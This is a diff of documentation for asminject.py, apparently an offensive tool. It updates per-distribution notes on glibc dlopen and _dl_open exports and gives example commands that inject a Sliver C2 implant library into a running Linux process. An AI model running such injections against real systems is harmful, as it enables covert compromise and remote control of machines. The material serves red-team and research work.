@@ -3,9 +3,9 @@
 * [Background](#background)
 * [Important](#important)
 * [dlopen with multithreading](#dlopen-with-multithreading)
-* [_dl_open with multithreading](#dl-open-with-multithreading)
+* [_dl_open with multithreading](#_dl_open-with-multithreading)
 * [dlopen without multithreading](#dlopen-without-multithreading)
-* [_dl_open without multithreading](#dl-open-without-multithreading)
+* [_dl_open without multithreading](#_dl_open-without-multithreading)
 
 ## Background
 
@@ -15,23 +15,33 @@ When `asminject.py` was originally developed, `dlinject.py` was hardcoded to loo
 
 * Debian and derivatives
   * Debian
+    * Debian 8.11, x86-64
+	  * `libc` version is Debian GLIBC 2.19-18+deb8u10
+      * `ld` library does not export `_dl_open`
+	  * `libc` library exports `__libc_dlopen_mode`
+	  * `libdl` library exports `dlopen`
     * Debian 10.6, ARM32 (Raspberry Pi)
 	  * `libc` version is Debian GLIBC 2.28-10+rpi1
       * `ld` library does not export `_dl_open`
-	  * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
 	  * `libc` library exports `__libc_dlopen_mode`
+	  * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
+	* Debian 11.0 x86-64
+	  * `libc` version is Debian GLIBC 2.31-13
+      * `ld` library does not export `_dl_open`
+	  * `libc` library exports `__libc_dlopen_mode`
+	  * `libdl` library exports `dlopen`
   * Kali
     * kali-rolling (updated in June 2022), x86-64
       * `libc` version is Debian GLIBC 2.33-6
       * `ld` library does not export `_dl_open`
-      * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
       * `libc` library exports `__libc_dlopen_mode`
+      * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
 * OpenSUSE
-  * OpenSUSE Tumbleweed 20220719, x86 (32-bit)
+  * OpenSUSE Tumbleweed 20220719, x86 (32-bit) and OpenSUSE Tumbleweed 20220731, x86-64
     * `libc` version is GNU libc 2.35
     * `ld` library exports `_dl_open`, and the signature should be `void * _dl_open(const char *file, int mode, const void *caller_dlopen, Lmid_t nsid, int argc, char *argv[], char *env[]);`
-	* `libdl` library does not export `dlopen`
 	* `libc` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
+	* `libdl` library does not export `dlopen`
 
 Some (older?) versions of `ld` allegedly use(d?) a simpler signature for `_dl_open`: `void * _dl_open(const char *file, int mode, const void *caller_dlopen);`, but I haven't run across this yet in order to test it.
 
@@ -51,7 +61,9 @@ This payload requires one variable: `librarypath`, which should point to the lib
 
 This payload requires relative offsets for the `ld` shared library used by the target process.
 
-Locate or build a `.so` file to open. For example, to set up a [Sliver](https://github.com/BishopFox/sliver) C2 listener and implant:
+Locate or build a `.so` file to open. The example below uses a [Sliver](https://github.com/BishopFox/sliver) C2 listener and implant.
+
+Note: in this example, the `--arch=386` option for the implant generation is specified because the corresponding `asminject.py` example below is using the `x86` architecture. For `x86-64`, you'd want to use `--arch=amd64`. For `arm32`, you could try using `--arch=arm`, but as of this writing Sliver doesn't seem to handle it well. I was going to include an example that used the `linux/armle/meterpreter/reverse_tcp` payload from Metasploit instead, but it seems that `elf-so` output for that payload isn't working at present.
 
 ```
 # ./sliver-server     
@@ -90,8 +102,8 @@ All hackers gain infect
 Inject the DLL into the target process:
 
 ```
-# python3 ./asminject.py 1957286 dlinject-threaded.s --arch x86\
-   --relative-offsets-from-binaries --stop-method "slow" \
+# python3 ./asminject.py 30320 dlinject-threaded.s \
+   --relative-offsets-from-binaries \
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
 
@@ -128,8 +140,8 @@ Reconnect Interval: 1m0s
 The `dlinject-ld-threaded.s` payload mimics the original `dlinject.py`, calling the `_dl_open` function that some versions of the `ld` library export (e.g. on OpenSUSE), and is multithreaded so that the target process continues executing normally after injection. `dlinject-ld-threaded.s` is currently an experimental feature, and only provided for the x86 architecture.
 
 ```
-# python3 ./asminject.py 1957286 dlinject-ld-threaded.s --arch x86 \
-   --relative-offsets-from-binaries --stop-method "slow" \
+# python3 ./asminject.py 30320 dlinject-ld-threaded.s \
+   --relative-offsets-from-binaries \
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
 ## dlopen without multithreading
@@ -137,8 +149,8 @@ The `dlinject-ld-threaded.s` payload mimics the original `dlinject.py`, calling 
 The `dlinject.s` payload is identical to the `dlinject-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:
 
 ```
-# python3 ./asminject.py 1957286 dlinject.s --arch x86-64 \
-   --relative-offsets-from-binaries --stop-method "slow" \
+# python3 ./asminject.py 30320 dlinject.s \
+   --relative-offsets-from-binaries \
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
 
@@ -147,7 +159,7 @@ The `dlinject.s` payload is identical to the `dlinject-threaded.s` payload, exce
 The `dlinject-ld.s` payload is identical to `dlinject-ld-threaded.s`, except that it does not call `_dl_open` in a separate thread. Like `dlinject.s`, this means that the `libpthread` library functions are not required, but it also means that the target process will stop doing its normal work in favour of whatever the injected code starts doing. `dlinject-ld.s` is currently an experimental feature, and only provided for the x86 architecture.
 
 ```
-# python3 ./asminject.py 1957286 dlinject-ld.s --arch x86 \
-   --relative-offsets-from-binaries --stop-method "slow" \
+# python3 ./asminject.py 30320 dlinject-ld.s \
+   --relative-offsets-from-binaries \
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
